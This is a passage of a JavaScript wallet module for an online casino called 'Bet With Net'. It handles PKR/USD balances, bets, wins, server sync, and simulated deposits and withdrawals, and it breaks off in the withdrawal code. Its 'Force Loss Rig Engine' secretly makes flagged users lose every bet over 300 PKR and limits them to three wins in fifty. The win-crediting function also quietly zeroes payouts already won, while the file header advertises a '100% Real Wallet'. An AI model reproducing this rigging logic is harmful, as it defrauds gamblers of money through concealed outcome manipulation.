// ============================================================
// Bet With Net - Real Wallet System (100% Real Wallet)
// ============================================================
function getRealWalletBalance() {
  try {
    const sess = localStorage.getItem('bwn_session_user');
    if (sess) {
      const u = JSON.parse(sess);
      if (u && (u.balance_pkr !== undefined || u.balancePKR !== undefined)) {
        return parseFloat(u.balance_pkr !== undefined ? u.balance_pkr : u.balancePKR);
      }
    }
  } catch(e) {}

  if (window.wallet && typeof window.wallet.getBalance === 'function') {
    return window.wallet.getBalance();
  }

  const saved = localStorage.getItem("BETWITHNET_balance");
  if (saved !== null && saved !== undefined && saved !== "" && saved !== "1000") {
    return parseFloat(saved);
  }

  const bwnSaved = localStorage.getItem("bwn_wallet_balance");
  if (bwnSaved !== null && bwnSaved !== undefined && bwnSaved !== "") {
    return parseFloat(bwnSaved);
  }

  return 0.00;
}

// ============================================================
// UNIVERSAL FORCE LOSS RIG ENGINE
// User Requirement:
// - When user outcomeBias is 'force_loss':
// - 1. Any bet > 300 PKR is 100% INSTANT LOSS.
// - 2. In every 50-bet cycle, user can win AT MOST 3 bets (and loses at least 47 bets).
// ============================================================
window.checkLossRigOutcome = function(betAmount, user = null, isWinSettlement = false) {
    try {
        let u = user;
        if (!u) {
            const sess = localStorage.getItem('bwn_session_user');
            if (sess) {
                try { u = JSON.parse(sess); } catch(e) {}
            }
        }
        if (!u && window.userManager && window.userManager.currentUser) {
            u = window.userManager.currentUser;
        }

        const bias = (u && (u.outcome_bias || u.outcomeBias)) || 'fair';
        if (bias !== 'force_loss') {
            return null; // Not rigged to force_loss
        }

        const numBet = parseFloat(betAmount) || 0;
        const uid = (u && (u.id || u.username)) || 'guest';
        const key = `bwn_loss_rig_${uid}`;

        let rigData = { cycleCount: 0, winsInCycle: 0 };
        try {
            const stored = localStorage.getItem(key);
            if (stored) rigData = JSON.parse(stored);
        } catch(e) {}

        if (!rigData || typeof rigData.cycleCount !== 'number') {
            rigData = { cycleCount: 0, winsInCycle: 0 };
        }

        // Rule 1: Instant loss if bet > 300 PKR
        if (numBet > 300) {
            if (!isWinSettlement) {
                rigData.cycleCount = (rigData.cycleCount + 1) % 50;
                if (rigData.cycleCount === 0) rigData.winsInCycle = 0;
                localStorage.setItem(key, JSON.stringify(rigData));
            }
            return false; // MUST LOSE
        }

        // Rule 2: Max 3 wins per 50 bets
        if (rigData.winsInCycle >= 3) {
            if (!isWinSettlement) {
                rigData.cycleCount = (rigData.cycleCount + 1) % 50;
                if (rigData.cycleCount === 0) rigData.winsInCycle = 0;
                localStorage.setItem(key, JSON.stringify(rigData));
            }
            return false; // Quota reached, MUST LOSE
        }

        // IF THIS IS WIN SETTLEMENT (creditWin):
        // Bet is <= 300 and user has NOT reached 3 wins quota!
        // The win MUST be permitted, credited, and recorded in rig state!
        if (isWinSettlement) {
            rigData.winsInCycle++;
            localStorage.setItem(key, JSON.stringify(rigData));
            return true;
        }

        // Otherwise this is pre-round game check (should user win this round?)
        const winsRemaining = Math.max(0, 3 - rigData.winsInCycle);
        const betsRemaining = Math.max(1, 50 - rigData.cycleCount);
        const winProbability = Math.min(1, winsRemaining / betsRemaining);

        const willWin = Math.random() < winProbability;

        rigData.cycleCount++;
        if (rigData.cycleCount >= 50) {
            rigData.cycleCount = 0;
            rigData.winsInCycle = 0;
        }
        localStorage.setItem(key, JSON.stringify(rigData));

        return willWin;
    } catch(e) {
        console.warn('[LossRigEngine] Error evaluating rig outcome:', e);
        return false;
    }
};

var realBalance = getRealWalletBalance();

function updateWalletUI() {
  realBalance = getRealWalletBalance();
  const walletEl = document.getElementById("realWallet");
  if(walletEl) {
    walletEl.innerText = "Rs. " + realBalance.toFixed(2);
  }
  const crBal = document.getElementById("crBalanceVal");
  if(crBal) {
    crBal.innerText = "Rs. " + realBalance.toFixed(2);
  }
  localStorage.setItem("BETWITHNET_balance", realBalance.toString());
  window.realBalance = realBalance;
}

function placeBet(amount) {
  amount = parseFloat(amount);
  if(isNaN(amount) || amount <= 0) return false;
  
  const currentBal = getRealWalletBalance();
  if(amount > currentBal) {
    const hasBonus = (window.wallet && window.wallet.state && window.wallet.state.bonusPKR > 0);
    const msg = hasBonus 
      ? "Bonus ke paison se game nahi kheli ja sakti! Game khelne ke liye pehle real balance deposit karein." 
      : "Balance kam hai! Rs. " + currentBal.toFixed(2);
    if (window.core && window.core.showToast) {
      window.core.showToast(msg, "warning");
    } else {
      alert(msg);
    }
    return false;
  }

  let deducted = false;
  if(window.wallet && typeof window.wallet.placeBet === 'function') {
    deducted = window.wallet.placeBet(amount, 'Chicken Rush');
    if (!deducted) {
      return false;
    }
  } else {
    const newBal = Math.max(0, currentBal - amount);
    localStorage.setItem("BETWITHNET_balance", newBal.toString());
    try {
      const sess = localStorage.getItem('bwn_session_user');
      if (sess) {
        const u = JSON.parse(sess);
        u.balance_pkr = newBal;
        u.balancePKR = newBal;
        u.balance_usd = parseFloat((newBal / 280).toFixed(2));
        u.balanceUSD = u.balance_usd;
        localStorage.setItem('bwn_session_user', JSON.stringify(u));
      }
    } catch(e) {}
    deducted = true;
  }

  updateWalletUI();
  return true;
}

function winBet(amount, multiplier) {
  let winAmount = parseFloat((parseFloat(amount) * parseFloat(multiplier)).toFixed(2));
  if(winAmount <= 0) return 0;

  if(window.wallet && typeof window.wallet.creditWin === 'function') {
    window.wallet.creditWin(amount, winAmount, 'Chicken Rush', multiplier);
  } else {
    const currentBal = getRealWalletBalance();
    const newBal = currentBal + winAmount;
    localStorage.setItem("BETWITHNET_balance", newBal.toString());
    try {
      const sess = localStorage.getItem('bwn_session_user');
      if (sess) {
        const u = JSON.parse(sess);
        u.balance_pkr = newBal;
        u.balancePKR = newBal;
        u.balance_usd = parseFloat((newBal / 280).toFixed(2));
        u.balanceUSD = u.balance_usd;
        localStorage.setItem('bwn_session_user', JSON.stringify(u));
      }
    } catch(e) {}
  }

  updateWalletUI();
  console.log("WIN: " + winAmount);
  return winAmount;
}

window.getRealWalletBalance = getRealWalletBalance;
window.realBalance = realBalance;
window.updateWalletUI = updateWalletUI;
window.placeBet = placeBet;
window.winBet = winBet;

// ============================================================
// Bet With Net - Realistic Multi-Currency Wallet Engine
// Base Currency: USD ($) with Dynamic Multi-Currency Exchange
// Min/Max Betting Limit Enforcement & Detailed PnL Ledger
// ============================================================

class WalletEngine {
    constructor() {
        this.STORAGE_KEY = 'bwn_wallet_state_v1';
        this.listeners = {};
        this.exchangeRate = 280; // 1 USD = 280 PKR default
        this._pendingBets = [];
        this._lastBetId = null;
        this._lastBetTime = parseInt(localStorage.getItem('bwn_last_bet_time') || '0', 10);
        this._lastWinTime = parseInt(localStorage.getItem('bwn_last_win_time') || '0', 10);
        this._syncLock = false;
        this.state = this.loadState();
    }

    getStorageKey() {
        try {
            const sess = localStorage.getItem('bwn_session_user');
            if (sess) {
                const u = JSON.parse(sess);
                if (u && u.id) return `bwn_wallet_state_${u.id}`;
            }
        } catch (e) {}
        return this.STORAGE_KEY;
    }

    getDefaultState() {
        return {
            balanceUSD: 0.00,
            balancePKR: 0.00,
            currency: 'PKR', // Default PKR display
            totalWageredUSD: 0,
            totalWonUSD: 0,
            totalWageredPKR: 0,
            totalWonPKR: 0,
            totalBetsCount: 0,
            vipPoints: 0,
            lastFaucetClaim: 0,
            transactions: [],
            betHistory: []
        };
    }

    loadState() {
        try {
            const raw = localStorage.getItem(this.getStorageKey());
            if (raw) {
                const parsed = JSON.parse(raw);
                const def = this.getDefaultState();
                const state = { ...def, ...parsed };
                state.transactions = Array.isArray(state.transactions) ? state.transactions : [];
                state.betHistory = Array.isArray(state.betHistory) ? state.betHistory : [];

                // Keep dual balances synchronized
                if (state.balancePKR !== undefined && (state.balanceUSD === undefined || state.balanceUSD === 0)) {
                    state.balanceUSD = parseFloat((state.balancePKR / this.exchangeRate).toFixed(2));
                } else if (state.balanceUSD !== undefined && (state.balancePKR === undefined || state.balancePKR === 0)) {
                    state.balancePKR = parseFloat((state.balanceUSD * this.exchangeRate).toFixed(2));
                }

                // Sync with logged in user session or load demo balance if not logged in
                try {
                    const sess = localStorage.getItem('bwn_session_user');
                    if (sess) {
                        const u = JSON.parse(sess);
                        if (u) {
                            const uBal = parseFloat(u.balance_pkr !== undefined ? u.balance_pkr : (u.balancePKR || 0));
                            state.balancePKR = uBal;
                            state.balanceUSD = parseFloat((uBal / this.exchangeRate).toFixed(2));
                        }
                    } else {
                        // User not logged in: preserve demo balance if active and > 0, else default to 10000
                        const demoBalStr = localStorage.getItem('bwn_demo_balance');
                        let dBal = (demoBalStr !== null && !isNaN(parseFloat(demoBalStr))) ? parseFloat(demoBalStr) : 10000;
                        if (dBal <= 0) dBal = 10000;
                        state.balancePKR = dBal;
                        state.balanceUSD = parseFloat((dBal / this.exchangeRate).toFixed(2));
                    }

                    // Purge legacy test residues from standalone keys
                    const realBal = state.balancePKR || 0;
                    ['bwn_wallet_balance', 'user_balance'].forEach(k => {
                        const v = localStorage.getItem(k);
                        if (v && (v.includes('1321302') || v.includes('678799') || v.includes('25000') || !sess)) {
                            localStorage.setItem(k, String(realBal));
                        }
                    });
                } catch(e) {
                    state.balancePKR = 0.00;
                    state.balanceUSD = 0.00;
                }

                if (!state.currency) state.currency = 'PKR';
                return state;
            }
        } catch (e) {
            console.warn('Failed to load wallet state:', e);
        }
        return this.getDefaultState();
    }

    syncWithUser(user) {
        if (!user) {
            this.state.balancePKR = 0.00;
            this.state.balanceUSD = 0.00;
            this.saveState();
            return;
        }
        const pkr = parseFloat(user.balance_pkr !== undefined ? user.balance_pkr : (user.balancePKR || 0));
        const usd = parseFloat(user.balance_usd !== undefined ? user.balance_usd : (user.balanceUSD || (pkr / this.exchangeRate)));
        this.state.balancePKR = pkr;
        this.state.balanceUSD = usd;
        this.saveState();
    }

    saveState() {
        try {
            const key = this.getStorageKey();
            localStorage.setItem(key, JSON.stringify(this.state));

            // Keep default key updated for cross-tab listeners
            if (key !== this.STORAGE_KEY) {
                localStorage.setItem(this.STORAGE_KEY, JSON.stringify(this.state));
            }

            // Always synchronize universal platform storage keys
            const balPkr = this.state.balancePKR !== undefined ? this.state.balancePKR : 0;
            localStorage.setItem('BETWITHNET_balance', String(balPkr));
            localStorage.setItem('bwn_wallet_balance', String(balPkr));
            localStorage.setItem('user_balance', String(balPkr));

            // Keep bwn_session_user updated so user_manager and core never roll back balance
            const sess = localStorage.getItem('bwn_session_user');
            if (sess) {
                try {
                    const u = JSON.parse(sess);
                    u.balance_pkr = this.state.balancePKR;
                    u.balance_usd = this.state.balanceUSD;
                    u.balancePKR = this.state.balancePKR;
                    u.balanceUSD = this.state.balanceUSD;
                    localStorage.setItem('bwn_session_user', JSON.stringify(u));
                    // Note: MySQL database is authoritative; client does not push overrides to prevent race conditions
                } catch (e) {}
            } else {
                localStorage.setItem('bwn_demo_balance', String(balPkr));
            }
        } catch (e) {
            console.error('Failed to save wallet state:', e);
        }
        this.emit('change', this.state);
        this.emit('balanceChange', this.getBalance());
    }

    on(event, callback) {
        if (!this.listeners[event]) this.listeners[event] = [];
        this.listeners[event].push(callback);
    }

    emit(event, data) {
        if (this.listeners[event]) {
            this.listeners[event].forEach(cb => cb(data));
        }
    }

    // Currency Settings
    setCurrency(curr) {
        if (['USD', 'PKR', 'EUR', 'GBP', 'USDT'].includes(curr)) {
            this.state.currency = curr;
            this.saveState();
        }
    }

    getCurrency() {
        return this.state.currency || 'PKR';
    }

    getCurrencySymbol(curr = null) {
        const c = curr || this.getCurrency();
        if (c === 'USD') return '$ ';
        if (c === 'PKR') return '₨ ';
        if (c === 'EUR') return '€ ';
        if (c === 'GBP') return '£ ';
        if (c === 'USDT') return '₮ ';
        return '$ ';
    }

    formatAmount(amount, curr = null) {
        const symbol = this.getCurrencySymbol(curr);
        return symbol + Number(amount || 0).toLocaleString('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    }

    // Returns active balance based on user's current currency
    getBalance() {
        if (this.state.currency === 'PKR') {
            return parseFloat(Number(this.state.balancePKR || 0).toFixed(2));
        }
        // Default USD
        return parseFloat(Number(this.state.balanceUSD || 0).toFixed(2));
    }

    hasBalance(amount) {
        const num = parseFloat(amount);
        if (!num || num <= 0) return false;

        // 1. Direct check in active currency
        if (this.getBalance() >= num) return true;

        // 2. Dual-currency cross validation:
        // If current display is USD ($17.99) but nominal amount is PKR scale (e.g. 100 PKR):
        if (this.state.currency === 'USD') {
            const equivUSD = num / this.exchangeRate;
            if (this.state.balanceUSD >= equivUSD) return true;
            if (this.state.balancePKR && this.state.balancePKR >= num) return true;
        } else {
            // Display is PKR but bet was entered in USD scale (e.g. $1)
            const equivPKR = num * this.exchangeRate;
            if (this.state.balancePKR >= equivPKR) return true;
        }
        return false;
    }

    // Convert amount from current currency to USD
    toUSD(amount) {
        if (this.state.currency === 'PKR') {
            return amount / this.exchangeRate;
        }
        return amount; // USD, USDT
    }

    fromUSD(amountUSD) {
        if (this.state.currency === 'PKR') {
            return amountUSD * this.exchangeRate;
        }
        return amountUSD;
    }

    // Direct Balance Mutators
    setBalanceUSD(newBalance) {
        this.state.balanceUSD = Math.max(0, parseFloat(newBalance) || 0);
        this.state.balancePKR = parseFloat((this.state.balanceUSD * this.exchangeRate).toFixed(2));
        this.saveState();
    }

    addBalanceUSD(delta) {
        this.setBalanceUSD(this.state.balanceUSD + delta);
    }

    setBalancePKR(newBalance) {
        this.state.balancePKR = Math.max(0, parseFloat(newBalance) || 0);
        this.state.balanceUSD = parseFloat((this.state.balancePKR / this.exchangeRate).toFixed(2));
        this.saveState();
    }

    addBalancePKR(delta, gameName = 'Casino Game') {
        const num = parseFloat(delta) || 0;
        if (num === 0) return true;
        if (num < 0) {
            return this.placeBet(Math.abs(num), gameName);
        } else {
            this.creditWin(0, num, gameName, 1, 'Balance Credit');
            return true;
        }
    }

    // VIP Rank
    getVIPTier() {
        const wagered = this.state.totalWageredUSD || (this.state.totalWageredPKR / this.exchangeRate);
        if (wagered >= 50000) return { name: 'Diamond VIP', multiplier: 2.0, color: '#00e5ff' };
        if (wagered >= 20000) return { name: 'Platinum VIP', multiplier: 1.5, color: '#ffd700' };
        if (wagered >= 5000) return { name: 'Gold VIP', multiplier: 1.25, color: '#f5a623' };
        if (wagered >= 1000) return { name: 'Silver VIP', multiplier: 1.1, color: '#bdc3c7' };
        return { name: 'Bronze VIP', multiplier: 1.0, color: '#cd7f32' };
    }

    // Place Bet with Game Min & Max Limits Validation & Dual Currency Support
    placeBet(amount, gameName = 'Casino') {
        const num = parseFloat(amount);
        if (!this.hasBalance(num)) {
            const hasBonus = (this.state.bonusPKR && this.state.bonusPKR > 0);
            const msg = hasBonus
                ? 'Bonus ke paison se game nahi kheli ja sakti! Game khelne ke liye pehle real balance deposit karein.'
                : 'Insufficient wallet balance for this bet!';
            if (window.core && window.core.showToast) {
                window.core.showToast(msg, 'error');
            } else {
                alert(msg);
            }
            return false;
        }

        // Intelligent resolution of USD vs PKR deduction
        let usdAmount, pkrAmount;
        if (this.state.currency === 'PKR') {
            // User is betting in PKR
            pkrAmount = num;
            usdAmount = parseFloat((num / this.exchangeRate).toFixed(4));
        } else {
            // User has USD display active.
            if (num > (this.state.balanceUSD || 0) && (num <= (this.state.balancePKR || 0) || (num / this.exchangeRate) <= (this.state.balanceUSD || 0))) {
                pkrAmount = num;
                usdAmount = parseFloat((num / this.exchangeRate).toFixed(4));
            } else {
                // Bet placed in USD
                usdAmount = num;
                pkrAmount = parseFloat((num * this.exchangeRate).toFixed(2));
            }
        }

        // Validate Game-Specific Min & Max Limits
        if (window.adminConfig) {
            const minBet = window.adminConfig.getGameMinBet ? window.adminConfig.getGameMinBet(gameName) : 0.50;
            const maxBet = window.adminConfig.getGameMaxBet ? window.adminConfig.getGameMaxBet(gameName) : 2500.00;

            if (usdAmount < minBet && num < 10) {
                const msg = `Minimum bet for ${gameName} is ${this.formatAmount(this.fromUSD(minBet))}`;
                if (window.core && window.core.showToast) window.core.showToast(msg, 'error');
                return false;
            }
            if (usdAmount > maxBet) {
                const msg = `Maximum bet limit for ${gameName} is ${this.formatAmount(this.fromUSD(maxBet))}`;
                if (window.core && window.core.showToast) window.core.showToast(msg, 'error');
                return false;
            }
        }

        // 1. Instant local deduction for 0-latency UI
        this.state.balanceUSD = Math.max(0, parseFloat((this.state.balanceUSD - usdAmount).toFixed(2)));
        this.state.balancePKR = Math.max(0, parseFloat((this.state.balancePKR - pkrAmount).toFixed(2)));
        this.state.totalWageredUSD = (this.state.totalWageredUSD || 0) + usdAmount;
        this.state.totalWageredPKR = (this.state.totalWageredPKR || 0) + pkrAmount;
        this.state.totalBetsCount = (this.state.totalBetsCount || 0) + 1;
        this.state.vipPoints = (this.state.vipPoints || 0) + Math.max(1, Math.floor(usdAmount));
        this._lastBetTime = Date.now();
        localStorage.setItem('bwn_last_bet_time', String(this._lastBetTime));

        this.saveState();
        if (window.sound && window.sound.playChip) window.sound.playChip();

        // 2. Authoritative background deduction in MySQL database
        this.syncBetToServer(pkrAmount, usdAmount, gameName);

        return true;
    }

    // Direct deduction method alias for Spribe Aviator and crash games
    deductBet(amount, gameName = 'Casino') {
        return this.placeBet(amount, gameName);
    }

    // Authoritative background bet sync to MySQL database
    async syncBetToServer(pkrAmount, usdAmount, gameName) {
        try {
            let user = null;
            const sess = localStorage.getItem('bwn_session_user');
            if (sess) {
                try { user = JSON.parse(sess); } catch(e) {}
            }
            if (!user && window.userManager && window.userManager.currentUser) {
                user = window.userManager.currentUser;
            }
            if (!user && window.core && window.core.getLoggedInUser) {
                user = window.core.getLoggedInUser();
            }
            if (!user || !user.id) return null;

            const payload = {
                user_id: user.id,
                game: gameName || 'Casino Game',
                amount: pkrAmount,
                currency: 'PKR'
            };

            const res = await fetch('/api/wallet.php?action=bet', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                credentials: 'include',
                keepalive: true,
                body: JSON.stringify(payload)
            });

            if (res.ok) {
                const json = await res.json();
                if (json && json.success && json.data) {
                    const betId = json.data.bet_id;
                    this._lastBetId = betId;
                    this._pendingBets.push({
                        betId: betId,
                        game: gameName,
                        amountPKR: pkrAmount,
                        amountUSD: usdAmount,
                        time: Date.now()
                    });
                    if (this._pendingBets.length > 50) this._pendingBets.shift();

                    if (json.data.new_balance_pkr !== undefined) {
                        const sBalPkr = parseFloat(json.data.new_balance_pkr);
                        this.state.balancePKR = sBalPkr;
                        this.state.balanceUSD = parseFloat(json.data.new_balance || (sBalPkr / this.exchangeRate));
                        this.saveState();
                        this.emit('change', this.state);
                        this.emit('balanceChange', this.state.balancePKR);
                        if (window.core && typeof window.core.updateAllBalances === 'function') {
                            window.core.updateAllBalances();
                        }
                    }
                    return betId;
                }
            } else {
                const errJson = await res.json().catch(() => null);
                if (errJson && errJson.message) {
                    if (window.core && window.core.showToast) {
                        window.core.showToast(errJson.message, 'error');
                    }
                }
                // Roll back optimistic local deduction if server rejected
                this.state.balancePKR = parseFloat((this.state.balancePKR + pkrAmount).toFixed(2));
                this.state.balanceUSD = parseFloat((this.state.balanceUSD + usdAmount).toFixed(2));
                this.saveState();
                this.emit('change', this.state);
                this.emit('balanceChange', this.state.balancePKR);
                if (window.core && typeof window.core.updateAllBalances === 'function') {
                    window.core.updateAllBalances();
                }
            }
        } catch(e) {
            console.warn('[WalletEngine] Real-time bet deduction warning:', e);
        }
        return null;
    }

    // Credit Win
    creditWin(betAmount, payoutAmount, gameName = 'Casino', multiplier = 1, details = '') {
        let numPayout = parseFloat(payoutAmount) || 0;
        const numBet = parseFloat(betAmount) || 0;

        // Force Loss Rig check: if rigged user bet > 300 or reached 3-win limit in 50 bets, force win to 0!
        // Note: In Aviator / Crash, loss occurs ONLY when the plane crashes!
        // If the player successfully cashed out before the plane crashed, do NOT zero out their cashout!
        const isAviatorCashout = (gameName && (gameName.includes('Aviator') || gameName.includes('Crash'))) && (details && details.includes('Cashed out'));
        if (!isAviatorCashout && typeof window.checkLossRigOutcome === 'function' && numPayout > 0) {
            const rigAllowed = window.checkLossRigOutcome(numBet, null, true);
            if (rigAllowed === false) {
                numPayout = 0;
                details = (details ? details + ' ' : '') + '(Force Loss Enforced)';
            }
        }

        let usdWin, usdBet, pkrWin, pkrBet;
        // Check if win calculation is PKR scale or USD scale
        if (this.state.currency === 'PKR' || (numBet > (this.state.balanceUSD || 0) && (numBet / this.exchangeRate) <= (this.state.balanceUSD || 0) + 10)) {
            pkrWin = numPayout;
            pkrBet = numBet;
            usdWin = parseFloat((numPayout / this.exchangeRate).toFixed(4));
            usdBet = parseFloat((numBet / this.exchangeRate).toFixed(4));
        } else {
            usdWin = numPayout;
            usdBet = numBet;
            pkrWin = parseFloat((numPayout * this.exchangeRate).toFixed(2));
            pkrBet = parseFloat((numBet * this.exchangeRate).toFixed(2));
        }

        const netProfitUSD = usdWin - usdBet;
        const netProfitPKR = pkrWin - pkrBet;

        this.state.balanceUSD = parseFloat((this.state.balanceUSD + usdWin).toFixed(2));
        this.state.balancePKR = parseFloat((this.state.balancePKR + pkrWin).toFixed(2));

        if (usdWin > 0) {
            this.state.totalWonUSD = (this.state.totalWonUSD || 0) + usdWin;
            this.state.totalWonPKR = (this.state.totalWonPKR || 0) + pkrWin;
        }

        const betRecord = {
            id: 'BET-' + Math.floor(100000 + Math.random() * 900000),
            game: gameName,
            bet: pkrBet,
            payout: pkrWin,
            betUSD: usdBet,
            payoutUSD: usdWin,
            profitUSD: netProfitUSD,
            profit: netProfitPKR,
            multiplier: Number(multiplier || 1).toFixed(2) + 'x',
            status: netProfitUSD > 0 ? 'WIN' : (usdWin === usdBet ? 'PUSH' : 'LOSS'),
            currency: this.state.currency,
            runningBalanceUSD: this.state.balanceUSD,
            runningBalancePKR: this.state.balancePKR,
            details: details,
            time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'}),
            timestamp: new Date().toISOString(),
            _serverSynced: true
        };

        if (!this.state.betHistory) this.state.betHistory = [];
        this.state.betHistory.unshift(betRecord);
        if (this.state.betHistory.length > 100) this.state.betHistory.pop();

        // Also record in UserManager for active user
        if (window.userManager && window.userManager.recordBet) {
            window.userManager.recordBet(betRecord);
        }

        this.saveState();

        // Update session user in localStorage immediately so all games have real-time winning balance
        try {
            const sess = localStorage.getItem('bwn_session_user');
            if (sess) {
                const u = JSON.parse(sess);
                u.balance_pkr = this.state.balancePKR;
                u.balancePKR = this.state.balancePKR;
                u.balance_usd = this.state.balanceUSD;
                u.balanceUSD = this.state.balanceUSD;
                localStorage.setItem('bwn_session_user', JSON.stringify(u));
            }
        } catch(e) {}

        this.emit('betCompleted', betRecord);
        this.emit('change', this.state);
        this.emit('balanceChange', this.state.balancePKR);
        if (typeof updateWalletUI === 'function') {
            updateWalletUI();
        }
        if (window.core && typeof window.core.updateAllBalances === 'function') {
            window.core.updateAllBalances();
        }

        // Authoritative background win payout in MySQL database
        if (pkrWin > 0) {
            this._lastWinTime = Date.now();
            localStorage.setItem('bwn_last_win_time', String(this._lastWinTime));
            localStorage.setItem('bwn_last_win_pkr', String(pkrWin));
            this.syncWinToServer(pkrBet, pkrWin, usdWin, gameName, multiplier, betRecord.id);
        }

        if (netProfitUSD > 0) {
            if (multiplier >= 10 && window.sound && window.sound.playJackpot) {
                window.sound.playJackpot();
            } else if (window.sound && window.sound.playWin) {
                window.sound.playWin();
            }
        } else if (numPayout === 0 && window.sound && window.sound.playLose) {
            window.sound.playLose();
        }

        return betRecord;
    }

    // Authoritative background win sync to MySQL database
    async syncWinToServer(pkrBet, pkrWin, usdWin, gameName, multiplier, localBetId) {
        try {
            let user = null;
            const sess = localStorage.getItem('bwn_session_user');
            if (sess) {
                try { user = JSON.parse(sess); } catch(e) {}
            }
            if (!user && window.userManager && window.userManager.currentUser) {
                user = window.userManager.currentUser;
            }
            if (!user && window.core && window.core.getLoggedInUser) {
                user = window.core.getLoggedInUser();
            }
            if (!user || !user.id) return;

            let betId = this._lastBetId;
            if (this._pendingBets.length > 0) {
                const popped = this._pendingBets.pop();
                if (popped && popped.betId) betId = popped.betId;
            }

            const payload = {
                user_id: user.id,
                bet_id: betId || '',
                game: gameName || 'Casino Game',
                bet_amount: pkrBet,
                payout: usdWin,
                payout_pkr: pkrWin,
                multiplier: parseFloat(multiplier) || 1.0,
                currency: 'PKR'
            };

            const res = await fetch('/api/wallet.php?action=win', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                credentials: 'include',
                keepalive: true,
                body: JSON.stringify(payload)
            });

            if (res.ok) {
                const json = await res.json();
                if (json && json.success && json.data) {
                    if (json.data.new_balance_pkr !== undefined) {
                        const sBalPkr = parseFloat(json.data.new_balance_pkr);
                        this.state.balancePKR = sBalPkr;
                        this.state.balanceUSD = parseFloat(json.data.new_balance || (sBalPkr / this.exchangeRate));
                        this.saveState();
                        this.emit('change', this.state);
                        this.emit('balanceChange', this.state.balancePKR);
                        if (window.core && typeof window.core.updateAllBalances === 'function') {
                            window.core.updateAllBalances();
                        }
                    }
                }
            }
        } catch(e) {
            console.warn('[WalletEngine] Real-time win sync warning:', e);
        }
    }

    // Multi-Currency Deposit Simulator with Conversion Rate to USD
    simulateDeposit(methodName, amountOriginal, senderAccount = '', trxId = '', currency = 'PKR', exchangeRate = 280) {
        return new Promise((resolve) => {
            const rate = parseFloat(exchangeRate) || this.exchangeRate || 280;
            const isUSD = (currency === 'USD' || currency === 'USDT');
            const amountUSD = isUSD ? parseFloat(amountOriginal) : parseFloat((amountOriginal / rate).toFixed(2));
            const amountPKR = isUSD ? parseFloat((amountOriginal * rate).toFixed(2)) : parseFloat(amountOriginal);

            const txnId = 'DEP-' + Math.floor(100000 + Math.random() * 900000);
            // Default to false: deposits must remain Pending until approved by admin
            const autoApprove = (localStorage.getItem('bwn_admin_auto_approve_dep') === 'true');

            setTimeout(() => {
                if (autoApprove) {
                    this.state.balanceUSD += amountUSD;
                    this.state.balancePKR += amountPKR;
                }

                const txn = {
                    id: txnId,
                    type: 'deposit',
                    method: methodName,
                    currency: currency,
                    amountOriginal: amountOriginal,
                    exchangeRate: rate,
                    amountUSD: amountUSD,
                    amountPKR: amountPKR,
                    sender: senderAccount || 'Self',
                    trxId: trxId || ('TX' + Date.now().toString().slice(-6)),
                    status: autoApprove ? 'Approved' : 'Pending',
                    date: new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
                    timestamp: new Date().toISOString()
                };

                if (!this.state.transactions) this.state.transactions = [];
                this.state.transactions.unshift(txn);
                this.saveState();

                try {
                    localStorage.setItem('bwn_latest_tx_broadcast', JSON.stringify({
                        id: txnId,
                        type: 'deposit',
                        amount: amountPKR,
                        amount_pkr: amountPKR,
                        amount_usd: amountUSD,
                        method: methodName,
                        sender_account: senderAccount || 'Player',
                        user_id: senderAccount || 'Player',
                        trx_id: txn.trxId,
                        timestamp: Date.now()
                    }));
                } catch(e) {}

                if (window.sound && autoApprove && window.sound.playWin) window.sound.playWin();
                resolve(txn);
            }, 500);
        });
    }

    // Multi-Currency Withdrawal Simulator with Conversion from USD
    simulateWithdraw(methodName, amountInput, accountTitle, accountNumber, pin, payoutCurrency = 'PKR', exchangeRate = 280) {
        return new Promise(async (resolve, reject) => {
            const numAmount = parseFloat(amountInput);
            if (!numAmount || numAmount <= 0) {
                return reject(new Error('Please enter a valid withdrawal amount.'));
            }

            const rate = parseFloat(exchangeRate) || this.exchangeRate || 280;
            const isUSD = (payoutCurrency === 'USD' || payoutCurrency === 'USDT');

            // Accurate determination of PKR and USD amounts
            let amountPKR, amountUSD;
            if (isUSD) {
                amountUSD = numAmount;
                amountPKR = parseFloat((numAmount * rate).toFixed(2));
            } else {
                // In Pakistani banking (EasyPaisa/JazzCash), user enters PKR amount (e.g. 500, 1000, 5000)
                amountPKR = numAmount;
                amountUSD = parseFloat((numAmount / rate).toFixed(2));
            }

            const currentBalPKR = parseFloat(this.state.balancePKR !== undefined ? this.state.balancePKR : (this.state.balanceUSD * rate));
            const currentBalUSD = parseFloat(this.state.balanceUSD !== undefined ? this.state.balanceUSD : (this.state.balancePKR / rate));

            // Verify sufficient balance in appropriate currency
            if (isUSD ? (currentBalUSD < amountUSD) : (currentBalPKR < amountPKR)) {
                return reject(new Error(`Insufficient balance! Your available balance is ₨ ${Number(currentBalPKR).toLocaleString()}`));
            }

            // Deduct immediately in USD and PKR
            this.state.balancePKR = Math.max(0, parseFloat((currentBalPKR - amountPKR).toFixed(2)));
            this.state.balanceUSD = Math.max(0, parseFloat((currentBalUSD - amountUSD).toFixed(2)));

            let txnId = 'WTH-' + Math.floor(100000 + Math.random() * 900000);

            // Synchronize with server MySQL database
            const userSession = (window.core && window.core.getLoggedInUser) ? window.core.getLoggedInUser() : null;
            if (userSession && userSession.id) {
                try {
                    const res = await fetch('/api/wallet.php?action=withdraw', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            user_id: userSession.id,
                            amount: amountPKR,
                            amount_pkr: amountPKR,
                            amount_usd: amountUSD,
                            currency: payoutCurrency || 'PKR',
                            method: methodName,
                            account_title: accountTitle,
                            account_number: accountNumber
                        })
                    });
                    const json = await res.json();
                    if (json && json.success && json.data && json.data.transaction_id) {
                        txnId = json.data.transaction_id;
                    }
                } catch (e) {
                    console.warn('Backend withdraw sync failed:', e);
                }
            }

            const autoApprove = (localStorage.getItem('bwn_admin_auto_approve_wth') === 'true');

            const txn = {
                id: txnId,
                type: 'withdraw',
                method: methodName,
                currency: payoutCurrency || 'PKR',
                amountUSD: amountUSD,
                payoutOriginal: numAmount,
                exchangeRate: rate,
                amountPKR: amountPKR,
                accountTitle: accountTitle,
                accountNumber: accountNumber,
                status: autoApprove ? 'Approved' : 'Pending',
